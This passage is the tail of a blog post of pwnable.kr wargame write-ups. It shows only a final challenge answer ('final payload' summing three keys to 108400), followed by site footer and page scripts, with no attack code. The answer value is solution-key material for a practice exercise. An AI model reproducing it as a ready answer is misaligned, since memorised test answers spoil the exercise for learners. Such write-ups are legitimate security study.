</code></pre><p>final payload = <code>key1</code> + <code>key2</code> + <code>key3</code> = <code>108400</code></p><p>TBC</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://0xlightyear.github.io/tags/wargames/>Wargames</a></li><li><a href=https://0xlightyear.github.io/tags/ctf/>CTF</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share pwnable.kr Writeups on twitter" href="https://twitter.com/intent/tweet/?text=pwnable.kr%20Writeups&amp;url=https%3a%2f%2f0xlightyear.github.io%2fposts%2fpwnable_kr_writeups%2f&amp;hashtags=Wargames%2cCTF"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share pwnable.kr Writeups on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xlightyear.github.io%2fposts%2fpwnable_kr_writeups%2f&amp;title=pwnable.kr%20Writeups&amp;summary=pwnable.kr%20Writeups&amp;source=https%3a%2f%2f0xlightyear.github.io%2fposts%2fpwnable_kr_writeups%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share pwnable.kr Writeups on reddit" href="https://reddit.com/submit?url=https%3a%2f%2f0xlightyear.github.io%2fposts%2fpwnable_kr_writeups%2f&title=pwnable.kr%20Writeups"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share pwnable.kr Writeups on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xlightyear.github.io%2fposts%2fpwnable_kr_writeups%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share pwnable.kr Writeups on whatsapp" href="https://api.whatsapp.com/send?text=pwnable.kr%20Writeups%20-%20https%3a%2f%2f0xlightyear.github.io%2fposts%2fpwnable_kr_writeups%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share pwnable.kr Writeups on telegram" href="https://telegram.me/share/url?text=pwnable.kr%20Writeups&amp;url=https%3a%2f%2f0xlightyear.github.io%2fposts%2fpwnable_kr_writeups%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://0xlightyear.github.io/>0xlightyear's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>